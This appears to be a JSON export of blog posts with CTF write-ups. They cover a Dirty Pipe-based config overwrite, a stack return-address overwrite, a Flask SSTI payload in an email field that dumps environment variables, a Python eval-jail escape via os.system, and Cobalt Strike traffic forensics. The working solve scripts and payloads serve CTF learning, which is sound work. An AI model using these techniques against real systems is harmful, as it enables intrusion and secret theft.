[{"content":"pwn dirtyRAT  Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I\u0026rsquo;m starting to suspect that I have been scammed\u0026hellip; Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\n We were given a binary and the source code.\nIt was mentioned early on that the title might be a wordplay on the recent Dirty Pipe vulnerability. But we disregarded the idea for a while. Also, we noticed a splice() in the code and found that a bit weird.\nRunning the binary, we get the following menu:\n60 seconds, PWN! Welcome to 88 88 88888888ba db 888888888888 88 \u0026#34;\u0026#34; ,d 88 \u0026#34;8b d88b 88 88 88 88 ,8P d8\u0026#39;`8b 88 ,adPPYb,88 88 8b,dPPYba, MM88MMM 8b d8 88aaaaaa8P\u0026#39; d8\u0026#39; `8b 88 a8\u0026#34; `Y88 88 88P\u0026#39; \u0026#34;Y8 88 `8b d8\u0026#39; 88\u0026#34;\u0026#34;\u0026#34;\u0026#34;88\u0026#39; d8YaaaaY8b 88 8b 88 88 88 88 `8b d8\u0026#39; 88 `8b d8\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;8b 88 \u0026#34;8a, ,d88 88 88 88, `8b,d8\u0026#39; 88 `8b d8\u0026#39; `8b 88 `\u0026#34;8bbdP\u0026#34;Y8 88 88 \u0026#34;Y888 Y88\u0026#39; 88 `8b d8\u0026#39; `8b 88 d8\u0026#39; d8\u0026#39; CLI Victim info:\tLinux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Whoami:\trat Available commands: 1)List files in folder. 2)Read file from our curated list of important files :) 3)Write data to one file from our curated list of important files :) 4)Win the CTF for me pls ‚âß‚ó°‚â¶ -1)Quit If we list files, we see there is a file called flag which we cannot read:\nYour choice: 1 total 1072 drwxr-xr-x 2 root root 4096 May 15 08:50 . drwxrwxrwt 1 root root 20480 May 15 08:50 .. -rw-r--r-- 1 user user 80 May 12 12:53 cards -rw-r--r-- 1 user user 48 May 12 12:53 conf -rwxr-xr-x 1 rat rat 1048040 May 12 12:53 dirtyRAT -rw-r--r-- 1 user user 31 May 12 12:53 flag -rw-r--r-- 1 user user 132 May 12 12:53 pasw -rw-r--r-- 1 user user 885 May 12 12:53 priv -rw-r--r-- 1 user user 43 May 12 12:53 secr What is interesting here is that the conf file contains a list of files we may read:\nYour choice: 2 Insert filename: conf How many bytes to read? (Max 127 eheheeheh): 127 File content: ##DIRTY CONFIG HEADER conf cards priv secr pasw PJ!ÔøΩ File read With this information and reading the code, we tried to exploit the binary.\nFirst, we tried to modify the config, but struggled since the only file we had write permissions to was dirtyRAT. Then we understood that the trouble with persmissions fit perfectly into the Dirty Pipe vulnerability. The version number you might have noticed under the banner is a kernel version vulnerable to Dirty Pipe. Also, the dirtyRAT binary contains all the code required to exploit the vulnerability. All we needed to do was to run them in the correct order:\n Fill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag Drain the pipe Splice 128 bytes from the priv file. We do this because there was a read in the way that we had to stop Splice 22 bytes from the conf file to skip header Add flag to the conf file  You can read more about exploiting the vulnerability here.\nThen after having flag successfully put into the conf file, we could read the file using the binary.\nAnd then we got the flag ptm{W4it_wa5nt_1t_r3ad_0nly!?}\nHere is the solve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT from pwn import *  exe = context.binary = ELF(\u0026#39;./files/chall/dirtyRAT\u0026#39;) host = args.HOST or \u0026#39;dirtyrat.challs.m0lecon.it\u0026#39; port = int(args.PORT or 10010)  def local(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39;  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39;  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39;  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = \u0026#39;\u0026#39;\u0026#39; tbreak main continue \u0026#39;\u0026#39;\u0026#39;.format(**locals())  #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: amd64-64-little # RELRO: Partial RELRO # Stack: Canary found # NX: NX enabled # PIE: No PIE (0x400000)  io = start()  def menu(choice):  io.sendlineafter(\u0026#34;choice: \u0026#34;, str(choice))  def list_files():  menu(1)  def read_file(filename, size):  menu(2)  io.sendlineafter(\u0026#34;filename: \u0026#34;, filename)  io.sendlineafter(\u0026#34;: \u0026#34;, str(size))  io.recvuntil(\u0026#34;File content:\u0026#34;)  io.recvline()  return io.recvline()  def write(filename, data, padding):  menu(3)  io.sendlineafter(\u0026#34;filename: \u0026#34;, filename)  io.sendlineafter(\u0026#34;: \u0026#34;, data)  io.sendlineafter(\u0026#34;: \u0026#34;, str(padding))  # 1. prepare_pipe (fill + drain) # 2. splice 128 bytes from priv # 3. splice 22 bytes from conf to skip header # 4. write to pipe # 5. read flag  pipe_size = 0x10000 write(\u0026#34;conf\u0026#34;, \u0026#34;A\u0026#34;*0x40, pipe_size - 0x40) read_file(\u0026#34;priv\u0026#34;, 128) read_file(\u0026#34;conf\u0026#34;, 22) write(\u0026#34;conf\u0026#34;, \u0026#34;flag\\n\u0026#34;, 0)  read_file(\u0026#34;flag\u0026#34;, 127) flag = read_file(\u0026#34;flag\u0026#34;, 127)[1:].decode().strip() log.success(f\u0026#34;flag: {flag}\u0026#34;) io.close() ptmList  Author: @Alberto247\nDescription: Thanks to ptmList you can keep your shopping list in order!\nstty -icanon \u0026amp;\u0026amp; socat - tcp:challs.m0lecon.it:8273 \u0026amp;\u0026amp; stty icanon\n In this challenge we get an ncurses-like interface we have to interact with. We can buy, move/merge, and delete items. Additionally we also have the Secret gift menu option to modify an item. More on this later.\nWe can have up to 50 items. Each item is represented as two bytes: an index into a list of strings describing the item and a quantity. Free items are represented as having an index and/or quantity of 0xff.\nOne thing we quickly noticed in myListController() is that there is a loop to find the next free item, but it goes all the way up to 0xff (255) instead of 50. The number of allocated items is stored in a variable and is updated when adding or deleting items.\nDue to the suspicious loop we assumed that there was a way to overflow or underflow the number of items. There is a check to prevent more than 50 items being allocated, so we started looking at the code to delete/move items. First there is a check in myListHandle() that causes trouble for us when we try to delete items when the number of items is zero, so we looked at move instead.\nMoving two items will swap their positions (and keep the quantity of the second item). If you try to move items of the same type, they will be merged instead of moved. As long as the combined quantity doesn\u0026rsquo;t exceed 99, the items can be merged and one of them will be deleted. The deletion code moves all items after our merged items one slot down, overwriting the second item we merged with. Finally, the number of allocated items will be decremented.\nThe loop will stop once it encounters an item with an index or quantity of 0xff. This is where the Secret gift menu comes into the picture. This option allows us to set the quantity of an item to 0xff. If we change the quantity of an item to 0xff, the merging code will stop looping when it reaches this item. What happens if we try to merge an item with one that has a quantity of 0xff? The quantities will be merged, effectively subtracting 1 from the quantity of the first item. Then, when the code tries to move all other items it will stop on the first iteration since the quantity is 0xff. Finally, the number of items will be decreased by one. By abusing this behavior we can keep merging one item with another one that has a quantity of 0xff, which will decrease the quantity of the first item by 1 and also decrease the number of items without removing any of them. Doing this a few times will underflow the count to 0xff.\nWhen the number of items is set to 0xff we can access data on the stack outside the item array. We can write values by changing the quantity of items and by moving and merging items.\nOur attack plan: Ovewrite the two least significant bytes of the return address on the stack with the address of winfunc(). The three lowest nibbles will always be 0x5e7, so we decided to just bruteforce the last one. We ended up buying the item 0x35 times, resulting in the two least significant bytes being 0x35e7.\n Buy wanted item(s) (to ovewrite least significant bytes of the return address) Buy 2 x box of tissues Secret gift on last box of tissues, setting its quantity to 0xff Merge 4 times to underflow the number of items Merge return address and with target, thus overwriting the return address with winfunc()  After running the solve script a few times, you should get a shell.\nFlag: ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}\nSolve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList from pwn import *  exe = context.binary = ELF(\u0026#39;./shoppingList\u0026#39;) host = args.HOST or \u0026#39;challs.m0lecon.it\u0026#39; port = int(args.PORT or 8273)  def local(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39;  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39;  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39;  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals())  def down():  io.send(\u0026#34;s\u0026#34;)  def up():  io.send(\u0026#34;w\u0026#34;)  def exit():  for i in range(3):  io.recvuntil(\u0026#34;Exit\u0026#34;)  down()  io.sendline(\u0026#34;\u0026#34;)   def buy(idx, quantity):  io.sendline(\u0026#34;\u0026#34;)  for i in range(idx):  down()  io.sendline(\u0026#34;\u0026#34;)   for i in range(quantity):  down()  io.sendline(\u0026#34;\u0026#34;)  io.send(\u0026#34;\\x1b\u0026#34;)  def secret(idx):  down()  down()  io.sendline(\u0026#34;\u0026#34;)   for i in range(idx):  down()  io.sendline(\u0026#34;\u0026#34;)  io = start()  # buy item to set up for partial overwrite: 0x35e7 buy(0xe7, 0x35) buy(0, 10) buy(0, 10) secret(2)  down() io.sendline(\u0026#34;\u0026#34;) down()  # merge 4 times to underflow for i in range(4):  io.send(\u0026#34;m\u0026#34;)  down()  io.send(\u0026#34;m\u0026#34;)  # go down to return address for i in range(59):  down()  # merge with first item we bought io.send(\u0026#34;m\u0026#34;) for i in range(60):  up() io.send(\u0026#34;m\u0026#34;)  # go back to main menu io.send(\u0026#34;\\x1b\u0026#34;)  # exit -\u0026gt; hopefully returns to winfunc() down() down() down() io.sendline(\u0026#34;\u0026#34;)  io.interactive() web Dumb Forum  Author: @italianconcerto\nDescription: You\u0026rsquo;re telling me you can\u0026rsquo;t break such a simple forum?\n We are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.\nThe flag is set in an environment variable in the Dockerfile. Knowing this we know our goal is to get access to the system environment variables.\nAfter reading through the source code of the Flask application, we find the following route (/profile) where the user can edit and view its profile.\n@app.route(\u0026#39;/profile\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @login_required def profile():  with open(\u0026#39;app/templates/profile.html\u0026#39;) as p:  profile_html = p.read()   profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)   if(current_user.about_me == None):  current_user.about_me = \u0026#34;\u0026#34;  return render_template_string(profile_html) Flask has existing methods for rendering template, for example render_template. However, in this case we see that the profile route reads the template file and uses string format instead to inject the username, email, and about_me of the user into the template.\nIn profile.html we can see this:\n\u0026lt;h5 class=\u0026#34;card-title\u0026#34;\u0026gt;Username: %s\u0026lt;/h5\u0026gt; \u0026lt;p\u0026gt;Email: %s\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;\u0026#34;\u0026gt;About me: %s\u0026lt;/p\u0026gt; The form is parsed through EditProfileForm, which contains:\nclass EditProfileForm(FlaskForm):  username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired()])  about_me = TextAreaField(\u0026#39;About me\u0026#39;, validators=[Length(min=0, max=1000)])  submit = SubmitField(\u0026#39;Submit\u0026#39;)   def __init__(self, original_username, *args, **kwargs):  super(EditProfileForm, self).__init__(*args, **kwargs)  self.original_username = original_username   def validate_username(self, username):  for c in \u0026#34;}{\u0026#34;:  if c in username.data:  abort(400)  #raise ValidationError(\u0026#39;Please use valid characters.\u0026#39;)  if username.data != self.original_username:  user = User.query.filter_by(username=self.username.data).first()  if user is not None:  abort(409)  #raise ValidationError(\u0026#39;Please use a different username.\u0026#39;)   def validate_about_me(self, about_me):  for c in \u0026#34;}{\u0026#34;:  if c in about_me.data:  abort(400) The form validates the username and about_me fields, and checks if they contains either of }{ (which are typically used with SSTI (Server Side Template Injection). But the form does not allow editing the email field of the user.\nWe find another form, RegistrationForm which is used during registration, and it is here, and only here, the email of the user is set. The validation of the email does however not include the }{ validation, which means we can register with an email and potentially perform a SSTI.\nclass RegistrationForm(FlaskForm):  username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired()])  email = StringField(\u0026#39;Email\u0026#39;, validators=[DataRequired(), Email()])  password = PasswordField(\u0026#39;Password\u0026#39;, validators=[DataRequired()])  password2 = PasswordField(\u0026#39;Repeat Password\u0026#39;, validators=[DataRequired(), EqualTo(\u0026#39;password\u0026#39;)])  submit = SubmitField(\u0026#39;Register\u0026#39;)   def validate_username(self, username):  for c in \u0026#34;}{\u0026#34;:  if c in username.data:  raise ValidationError(\u0026#39;Please use valid characters.\u0026#39;)  user = User.query.filter_by(username=username.data).first()  if user is not None:  raise ValidationError(\u0026#39;Please use a different username.\u0026#39;)   def validate_email(self, email):  user = User.query.filter_by(email=email.data).first()  if user is not None:  raise ValidationError(\u0026#39;Please use a different email address.\u0026#39;) The email field does however include an email validator: email = StringField('Email', validators=[DataRequired(), Email()])\nWe see that this validator comes from wtforms: from wtforms.validators import ValidationError, DataRequired, Email, EqualTo\nLooking into the source code of the wtforms validator, we see that it uses the email-validator library.\nBy looking at the specification for the local-part of an email, we see that the following characters are allowed in an email:\n  uppercase and lowercase Latin letters A to Z and a to z digits 0 to 9 printable characters !#$%\u0026amp;\u0026rsquo;*+-/=?^_`{|}~ dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., John..Doe@example.com is not allowed).[5] space and special characters \u0026ldquo;(),:;\u0026lt;\u0026gt;@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash); comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com.   This means that an email such as {{self.__dict__}}@a.a will be considered a valid email.\nWe now know that our goal is to perform a SSTI on the email field.\nWe can use the get_flashed_messages of Flask to get the __globals__ of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag. {{get_flashed_messages.__globals__.os.environ}}@z.c\nEmail: environ({ \u0026#34;PATH\u0026#34;:\u0026#34;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;HOSTNAME\u0026#34;:\u0026#34;35250adbc3f0\u0026#34;, \u0026#34;LANG\u0026#34;:\u0026#34;C.UTF-8\u0026#34;, \u0026#34;GPG_KEY\u0026#34;:\u0026#34;A035C8C19219BA821ECEA86B64E628F8D684696D\u0026#34;, \u0026#34;PYTHON_VERSION\u0026#34;:\u0026#34;3.10.4\u0026#34;, \u0026#34;PYTHON_PIP_VERSION\u0026#34;:\u0026#34;22.0.4\u0026#34;, \u0026#34;PYTHON_SETUPTOOLS_VERSION\u0026#34;:\u0026#34;58.1.0\u0026#34;, \u0026#34;PYTHON_GET_PIP_URL\u0026#34;:\u0026#34;https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py\u0026#34;, \u0026#34;PYTHON_GET_PIP_SHA256\u0026#34;:\u0026#34;e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a\u0026#34;, \u0026#34;FLASK_APP\u0026#34;:\u0026#34;main.py\u0026#34;, \u0026#34;FLAG\u0026#34;:\u0026#34;ptm{d1d_u_f1nd_th3_r1ckr0ll?}\u0026#34;, \u0026#34;HOME\u0026#39;:\u0026#34;/home/app\u0026#34;} )@a.a FLAG: ptm{d1d_u_f1nd_th3_r1ckr0ll?}\n","permalink":"https://bootplug.io/posts/ctf/m0leconctf_2022/","summary":"pwn dirtyRAT  Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I\u0026rsquo;m starting to suspect that I have been scammed\u0026hellip; Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\n We were given a binary and the source code.\nIt was mentioned early on that the title might be a wordplay on the recent Dirty Pipe vulnerability. But we disregarded the idea for a while.","title":"m0leCon CTF 2022 Teaser"},{"content":"Misc üî• Kalk üî•  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os   class Math(dict):  def __init__(self):  self.e = 0  self.pi = 0   def kalk(src, locals):  if \u0026#39;=\u0026#39; in src:  co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;)  for opc in dis.get_instructions(co):  if opc.opname not in [\u0026#39;LOAD_NAME\u0026#39;, \u0026#39;LOAD_CONST\u0026#39;, \u0026#39;STORE_NAME\u0026#39;, \u0026#39;STORE_ATTR\u0026#39;, \u0026#39;RETURN_VALUE\u0026#39;]:  print(\u0026#34;Bonk! \u0026gt;.\u0026lt;\u0026#34;, opc.opname)  return  eval(co, {}, locals)  else:  co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;eval\u0026#34;)  for opc in dis.get_instructions(co):  if \u0026#39;CALL\u0026#39; in opc.opname:  print(\u0026#39;No U! \u0026gt;.\u0026lt;\u0026#39;)  return   _ = eval(co, {}, locals | {\u0026#39;math\u0026#39;: Math(), \u0026#39;tease\u0026#39;: os.system})  locals[\u0026#39;_\u0026#39;] = _  return _   locals = {} while True:  r = kalk(input(\u0026#39;\u0026gt; \u0026#39;), locals)  if r is not None:  print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don\u0026rsquo;t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don\u0026rsquo;t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046  \u0026gt; math {} \u0026gt; test = _ \u0026gt; test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046 \u0026gt; math.__class__ \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; \u0026gt; Math = _ \u0026gt; Math \u0026lt;class \u0026#39;__main__.Math\u0026#39;\u0026gt; Great, now we can overwrite __add__ with os.system\n\u0026gt; tease \u0026lt;built-in function system\u0026gt; \u0026gt; Math.__add__ = _ At last we can set the class of math to be our new class.\n\u0026gt; math {} \u0026gt; math = _ \u0026gt; math.__class__ = Math Now we should be able to run system commands by doing addition.\n\u0026gt; math + \u0026#34;id\u0026#34; uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0 \u0026gt; math + \u0026#34;ls\u0026#34; flag.txt kalk.py ynetd 0 \u0026gt; math + \u0026#34;cat flag.txt\u0026#34; EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\nüî• Know your encoding üî•  Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\n We are also provided with a file:\nfrom datetime import datetime from random import Random from time import time  def chunks(lst, n):  \u0026#34;\u0026#34;\u0026#34;Yield successive n-sized chunks from lst.\u0026#34;\u0026#34;\u0026#34;  for i in range(0, len(lst), n):  yield lst[i:i + n]  ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39; def special_encoding(word, count):  b = Random()  b.seed(int(time() * 1000))  if count:  a = \u0026#39;\u0026#39;.join(b.sample(ALPHABET,len(ALPHABET)))  else:  a = ALPHABET  encoded = \u0026#39;\u0026#39;  for x in chunks(\u0026#34;\u0026#34;.join([bin(int(byte)).lstrip(\u0026#39;0b\u0026#39;).zfill(8) for byte in word.encode(\u0026#34;ascii\u0026#34;)]), 24):  y = list(chunks(x, 6))  for value in y:  encoded += a[int(value.ljust(6, \u0026#34;0\u0026#34;), 2)]  print(f\u0026#34;{datetime.fromtimestamp(int(time()))}- Decode the following: {encoded}\u0026#34;, flush=True) Upon connecting we\u0026rsquo;re greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we\u0026rsquo;re greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let\u0026rsquo;s analyze the code:\n chunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it\u0026rsquo;s fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside)  Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it\u0026rsquo;s divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the \u0026ldquo;alphabet-lookup string\u0026rdquo; a   After looping over the whole bitstring the encoded result is provided prefixed with the server\u0026rsquo;s current time.  Before I show the solution script there\u0026rsquo;s a few gotchas with this challenge that I\u0026rsquo;d like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don\u0026rsquo;t know the value of this variable and so we can\u0026rsquo;t be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you\u0026rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that\u0026rsquo;s worth noticing is that the time() used to seed the random generator isn\u0026rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn\u0026rsquo;t pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase  ALPHABET = \u0026#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789\u0026#39;   def decode(s, mapping):  bs = \u0026#34;\u0026#34;.join([bin(mapping.index(c)).lstrip(\u0026#34;0b\u0026#34;).zfill(6) for c in s])  bs = bs[:(len(bs) // 8) * 8]  return long_to_bytes(int(bs, 2))   def solve(base_time, chall):  for drift in range(1000):  tm = base_time * 1000 + drift   b = Random()  b.seed(tm)   for mapping in [\u0026#39;\u0026#39;.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]:  bts = decode(chall, mapping)  if all([chr(char) in ascii_lowercase for char in bts]):  return bts  else:  log.error(\u0026#34;Couldn\u0026#39;t find solution\u0026#34;)   r = remote(\u0026#34;io.ept.gg\u0026#34;, 30045) r.sendline(b\u0026#34;y\u0026#34;) r.recvline() r.recvline() for i in range(100):  chal = r.recvline().decode()   dt = datetime.fromisoformat(chal.split(\u0026#34; - \u0026#34;)[0]).strftime(\u0026#34;%s\u0026#34;)   server_time = int(dt) + 3600 # adjust to the same timezone as the server   ans = solve(server_time, chal.split(\u0026#34;: \u0026#34;)[1].strip())  print(ans)  r.sendline(ans)  assert r.recvline() == b\u0026#34;Correct!\\n\u0026#34;  r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that\u0026rsquo;s corrected for the timezone) we have to do some brute force, because the time value we\u0026rsquo;re provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it\u0026rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it\u0026rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that\u0026rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we\u0026rsquo;re done.\nsubmitting So now we have a possible correct result, but since we\u0026rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we\u0026rsquo;ve found the correct answer. But we won\u0026rsquo;t know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\nForensics üî• Eastbound \u0026amp; Pwned üî•  Author: LOLASL\nDescription: KennyP thinks that Anti-Virus is for wussies and that his enemies can\u0026rsquo;t touch him, but we are now observing hits on a signature that could indicate the presence of Cobalt Strike on his computer.\nWe have retrieved the network traffic in question and a memory dump of the machine (Windows 10 x64 Build 19043.1237), can you figure out what the attacker has been up to?\nEastboundAndPwned.zip\n We are provided with an archive (EastboundAndPwned.zip), which contains a network capture (LA-FLAMA-BLANCA-20211025-071559.pcap) and a memory dump (LA-FLAMA-BLANCA-20211025-071559.raw).\nCobalt Strike The challenge description mentions Cobalt Strike, which is:\n [Cobalt Strike] is a commercial, full-featured, remote access tool that bills itself as \u0026ldquo;adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors\u0026rdquo;. Cobalt Strike‚Äôs interactive post-exploit capabilities cover the full range of ATT\u0026amp;CK tactics, all executed within a single, integrated system.\n Source: MITRE ATT\u0026amp;CK¬Æ\nIn short: it is a tool that is used to be able to remotely control a system. Malicious actors have used it for years to deploy ‚ÄúListeners‚Äù on victim machines. To solve this challenge we need to get a better understanding of how Cobalt Strike communicates, and how it can be configured.\nC2 Communication The art and science of detecting Cobalt Strike by Nick Navis (@nickmavis) from Cisco Talos, describes the C2 communication as such:\n Infection: The client is infected with either a staged, or a stageless payload. For a stageless payload, it will decode itself, and then load itself into memory. The configuration for the beacon is XOR encrypted but by default, use a static XOR key for each respective beacon version (3 or 4). Heartbeat: The infected host sends a heartbeat to the Cobalt Strike C2 server with basic metadata and queues up any commands (read Tasks) that were added. Tasks: Cobalt Strike uses AES-256 in CBC mode with HMAC-SHA-256 to encrypt task commands (i.e. commands sent remotely by the attacker). The AES key can be found in the encrypted metadata that is sent during a heartbeat, but it also lives shortly in memory of the infected process. Callbacks: After a task is executed, the host calls back to the C2 server with a encrypted payload containing the results of the task.  A more detailed explanation can be found on page 10 and 11 in the paper by Nick Navis.\nA diagram of the Cobalt Strike C2 communication flow. Source: NVISO Labs\nBeacon Configuration Didier Stevens has made a tool, 1768 K, which decodes and dumps the configuration of Cobalt Strike beacons. He later updated this tool (3 weeks ago at the time of writing this) with newer statistics.\nDecrypting Cobalt Strike Traffic Didier Stevens made yet another blog post, \u0026ldquo;Quickpost: Decrypting Cobalt Strike Traffic\u0026rdquo;. He made a tool (cs-extract-key.py) that looks in the dumped process memory for the unencrypted metadata that the beacon sends to the C2. Furthermore, he also made a tool (cs-parse-http-traffic.py) that can use the extracted keys to decrypt and parse the encrypted HTTP C2 communication in a PCAP file.\nSolution Our goal is \u0026ldquo;simple\u0026rdquo;, we need to decrypt the traffic between the infected host and the C2 server. From our research above we know that we have to:\n Extract and decrypt the Cobalt Strike Beacon configuration Dump the memory of the process that was infected with the payload Extract the AES and HMAC keys from the process memory Use these keys to decrypt the C2 (HTTP) communication  Extracting And Decoding Beacon Configuration Opening the PCAP in Wireshark, we can easily filter on http and find the Cobalt Strike stager shellcode request and thus the beacon in tcp.stream eq 9. We export this payload to a file (ept_beacon).\nGET /stE1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; LBBROWSER) Host: 172.16.32.2 Connection: Keep-Alive Cache-Control: no-cache  HTTP/1.1 200 OK Date: Mon, 25 Oct 2021 07:12:52 GMT Content-Type: application/octet-stream Content-Length: 261191 --- snip --- We use the updated 1768 tool to extract the configuration for the C2 beacon, note the process injection configuration.\n$ python 1768.py -r ept_beacon File: ept_beacon xorkey(chain): 0xa6b02dff length: 0x03fc0089 Config found: xorkey b\u0026#39;.\u0026#39; 0x00000000 0x000057cf 0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http 0x0002 port 0x0001 0x0002 80 0x0003 sleeptime 0x0002 0x0004 60000 0x0004 maxgetsize 0x0002 0x0004 1048576 0x0005 jitter 0x0001 0x0002 0 0x0006 maxdns 0x0001 0x0002 255 